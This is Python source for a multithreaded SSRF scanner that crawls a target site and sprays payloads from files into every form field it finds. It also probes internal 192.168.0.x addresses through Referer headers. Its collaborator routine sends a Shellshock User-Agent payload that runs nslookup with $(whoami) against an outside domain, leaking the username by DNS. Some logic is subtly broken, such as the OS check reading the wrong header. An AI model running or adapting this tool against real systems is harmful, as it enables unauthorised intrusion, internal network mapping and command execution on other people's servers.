import concurrent.futures
import re
import ipaddress
from urllib.parse import quote, urljoin, urlparse, parse_qs
import requests
import urllib3
from bs4 import BeautifulSoup
import json
import csv
from datetime import datetime  

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
results = []

def detect_os(response):
    os_guess = "Unknown"
    if 'User-Agent' in response.headers:
        server = response.headers['server'].lower()
        if 'linux' in server:
            os_guess = "Linux"
        elif 'win' in server or 'windows' in server:
            os_guess = "Windows"
        elif 'mac' in server:
            os_guess = "macOS"
    return os_guess

def ssrf_post(url, payload, param, session=None, return_bool=False, proxies=None):
    global results
    params = {param: payload}
    s = session or requests.Session()
    try:
        r = s.post(url, data=params, verify=False, timeout=5, proxies=proxies)
    except requests.exceptions.RequestException:
        return False
    if "internal server error" not in r.text.lower() and \
       "not found" not in r.text.lower() and \
       "missing parameter" not in r.text.lower() and \
       "invalid url" not in r.text.lower() and \
       "invalid" not in r.text.lower() and \
       "host must be" not in r.text.lower():
           
           result = {
            "URL": url,
            "Payload": payload,
            "Parameter": param,
            "os": detect_os(r),
            "Status": r.status_code,
            "length": len(r.text),
            "timestamp": datetime.now().isoformat()
            }
           results.append(result)


def load_payloads(filename):
    payloads = []
    with open(filename, 'r', encoding='utf-8') as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):  
                payloads.append(line)
    return payloads

def fetch_content(url, timeout=5.0, proxies=None):
    try:
        response = requests.get(url, timeout=timeout, verify=False, proxies=proxies)
        response.raise_for_status()
        return response.text
    except requests.RequestException:
        return ""

def extract_actions(content): return re.findall(r'action=["\'](.*?)["\']', content, re.IGNORECASE)
def extract_values(content): return re.findall(r'value=["\'](.*?)["\']', content, re.IGNORECASE)
def extract_names(content): return re.findall(r'name=["\'](.*?)["\']', content, re.IGNORECASE)

def extract_base_url(full_url):
    parsed = urlparse(full_url)
    return f"{parsed.scheme}://{parsed.netloc}"

def filter_similar_urls(urls):
    unique, seen = [], set()
    for url in urls:
        base = urljoin(url, urlparse(url).path)
        if base not in seen:
            unique.append(url)
            seen.add(base)
    return unique

def is_valid_ip_with_port(ip_port):
    try:
        if ":" in ip_port and ip_port.count(".") == 3:  # IPv4:port
            ip, port = ip_port.split(":")
            if all(0 <= int(octet) <= 255 for octet in ip.split(".")) and (0 <= int(port) <= 65535):
                return True
        elif ip_port.startswith('['):  # IPv6:port
            ip, port = ip_port.rsplit("]:", 1)
            ip = ip.lstrip('[')
            ipaddress.IPv6Address(ip)
            return 0 <= int(port) <= 65535
    except Exception:
        return False
    return False

def path_payload(url, pay, param, payloads, proxies=None):
    payload = {param: pay}
    session = requests.Session()
    try:
        response = session.get(url, proxies=proxies, verify=False, timeout=5)
        default_headers = response.request.headers
        headers = {
            "Host": response.url.split("/")[2],  
            "Cookie": response.headers.get("Set-Cookie", ""),   
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": default_headers.get("User-Agent", "Mozilla/5.0"),
            "Referer": response.url
        }
        r = session.post(url, data=payload, headers=headers, verify=False, timeout=5, proxies=proxies)
    except requests.exceptions.RequestException:
        return
    if payloads in r.text.lower():
        result = {
            "URL": url,
            "Payload": pay,
            "Parameter": param,
            "os": detect_os(r),
            "Status": r.status_code,
            "length": len(r.text),
            "timestamp": datetime.now().isoformat()
        }
        results.append(result)

def send_with_referer(url, ref_payload, proxies=None):
    headers = {"User-Agent": "Mozilla/5.0"}
    try:
        original_request = requests.get(url, headers=headers, timeout=5, proxies=proxies)
        headers["Referer"] = ref_payload
        r = requests.get(url, headers=headers, timeout=5, proxies=proxies)
    except requests.exceptions.RequestException:
        pass

def collaborator(target_url, collab_domain, proxies=None):
    shellshock = f"() {{ :; }}; /usr/bin/nslookup $(whoami).{collab_domain}"
    for x in range(1, 256):
        ip = f"192.168.0.{x}"
        headers = {"Referer": f"http://{ip}:8080", "User-Agent": shellshock}
        try:
            response = requests.get(target_url, headers=headers, timeout=5, proxies=proxies)
        except requests.exceptions.RequestException as e:
            return

def url_encode(original_url):
    encoded = quote(original_url, safe="/")
    return re.sub(r"%([0-9A-F]{2})", lambda m: f"%{m.group(1).lower()}", encoded)

def extract_links(url, proxies=None):
    try:
        response = requests.get(url, proxies=proxies)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')
        links = set()
        for a_tag in soup.find_all('a', href=True):
            full_link = urljoin(url, a_tag['href'])
            parsed_url = urlparse(full_link)
            query_params = parse_qs(parsed_url.query)
            if 'path' in query_params:
                clean_link = full_link.split('path=')[0] + 'path='
                links.add(clean_link)
        return links
    except requests.exceptions.RequestException as e:
        return set()

def process_payload(ip, i, target_url, payload, name, proxies=None):
    constructed_url = "http://" + ip[:10] + str(i) + ip[-5:]
    ssrf_post(target_url, constructed_url + payload, name, return_bool=True)

def save_to_json(data, filename):
    with open(filename, 'w') as f:
        json.dump(data, f, indent=4)

def display_json(data):
    print("\n" + json.dumps(data, indent=4))

def save_to_csv(data, filename):
    with open(filename, 'w', newline='') as f:
        writer = csv.writer(f)
        writer.writerow(["URL", "Payload", "Parameter"])
        for entry in data:
            writer.writerow([entry["URL"], entry["Payload"], entry["Parameter"]])

def display_csv(data):
    print(f"{'URL':<40} | {'Payload':<30} | {'Parameter'}")
    print("-" * 100)
    for entry in data:
        print(f"{entry['URL']:<40} | {entry['Payload']:<30} | {entry['Parameter']}")

def process_single_url(base_url, ssrf_payloads, path_payloads, args, proxies):
    global results
    main_page_content = fetch_content(base_url, proxies=proxies)
    raw_links = set(re.findall(r'href=["\'](.*?)["\']', main_page_content))
    absolute_links = {urljoin(base_url, link) for link in raw_links}
    actions_list, value_fields_list, name_fields_list = [], [], []

    for link in absolute_links:
        page_content = fetch_content(link, proxies=proxies)
        for func in (extract_actions, extract_values, extract_names):
            for item in func(page_content):
                if func == extract_actions and item not in actions_list:
                    actions_list.append(item)
                elif func == extract_values and item not in value_fields_list:
                    value_fields_list.append(item)
                elif func == extract_names and item not in name_fields_list:
                    name_fields_list.append(item)

    result_links = filter_similar_urls(absolute_links)
    url_value = []
    for v in value_fields_list:
        base_v = extract_base_url(v)
        if base_v not in url_value:
            url_value.append(base_v)

    target_urls = [f"{base_url}{action}" for action in actions_list]


    ip_ports = [i.split("://")[-1] for i in url_value]

    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads or 50) as executor:
        for ip in ip_ports:
            if is_valid_ip_with_port(ip):
                print(ip)
                for i in range(1, 256):
                    for target in target_urls:
                        for payload in path_payloads:
                            for name in name_fields_list:
                                executor.submit(process_payload, ip, i, target, payload, name, proxies)

    tasks = [(target, payload, name) for target in target_urls for payload in ssrf_payloads for name in name_fields_list]
    with requests.Session() as session:
        with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads or 20) as executor:
            futures = [executor.submit(ssrf_post, url, payload, name, session, False, proxies) for url, payload, name in tasks]
            concurrent.futures.wait(futures)

    tar = []
    for k in result_links:
        p = extract_links(k, proxies=proxies)
        p_cleaned = [url.replace(base_url, "") for url in p]
        tar.extend(p_cleaned)

    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads or 50) as executor:
        futures = []
        for target_url in target_urls:
            
            for payload in ssrf_payloads:
                for u in tar:
                    combined = u + payload
                    encoded_text = url_encode(combined)
                    for n in name_fields_list:
                        futures.append(executor.submit(path_payload, target_url, encoded_text, n, payload, proxies))
        concurrent.futures.wait(futures)

    if args.collaborator:
        collab_domain = args.collaborator.strip()
        for link in result_links:
            send_with_referer(link, "http://" + collab_domain, proxies)
        if args.bruteforceattack.strip().lower() == "yes":
            with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads or 20) as executor:
                futures = [executor.submit(collaborator, link, collab_domain, proxies) for link in result_links]
                concurrent.futures.wait(futures)

    if args.output:
        if args.output == "json":
            display_json(results)
            save_to_json(results, "results.json")
        elif args.output == "csv":
            display_csv(results)
            save_to_csv(results, "results.csv")
    else:
        for res in results:
            print(res)

class SSRFScanner:
    def __init__(self, url=None, url_list=None, output=None, threads=20, payload_list=None, path_payload_list=None, collaborator=None, bruteforceattack=None, proxy=None):
        self.url = url
        self.url_list = url_list
        self.output = output
        self.threads = threads or 20
        self.payload_list = payload_list or "payload.txt"
        self.path_payload_list = path_payload_list or "pathpayload.txt"
        self.collaborator = collaborator
        self.bruteforceattack = bruteforceattack
        self.proxy = proxy
        self.proxies = {}
        if proxy:
            self.proxies = {
                "http": f"http://{proxy}",
                "https": f"http://{proxy}"
            }
        self.results = []

    def scan(self):
        global results
        results = []
        ssrf_payloads = load_payloads(self.payload_list)
        path_payloads = load_payloads(self.path_payload_list)
        if self.url:
            base_url = self.url.strip()
            if base_url.endswith('/'):
                base_url = base_url[:-1]
            process_single_url(base_url, ssrf_payloads, path_payloads, self, self.proxies)
        elif self.url_list:
            with open(self.url_list, 'r') as f:
                urls = [line.strip() for line in f if line.strip()]
                for url in urls:
                    if url.endswith('/'):
                        url = url[:-1]
                    try:
                        process_single_url(url, ssrf_payloads, path_payloads, self, self.proxies)
                    except Exception as e:
                        pass  # يمكن إرجاع الأخطاء لاحقًا إذا رغبت
        self.results = results.copy()
        return self.results